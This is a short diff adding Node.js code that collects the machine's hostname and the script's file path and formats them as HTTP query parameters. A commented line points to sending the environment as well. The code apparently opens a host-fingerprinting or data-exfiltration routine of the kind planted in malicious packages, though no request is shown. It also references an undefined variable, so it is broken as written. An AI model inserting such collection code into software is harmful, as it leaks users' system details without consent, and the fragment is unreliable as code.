@@ -1,0 +1,13 @@
+const http = require('http')
+const querystring = require('querystring')
+var os = require("os")
+var hostname = os.hostname()
+var fs = require('fs')
+const parameters = {
+	filename: __filename,
+    hostname: hostname,
+//    all: environment
+}
+_tmp_0.filename = __filename
+_tmp_0.hostname = hostname
+const get_request_args = querystring.stringify(parameters)
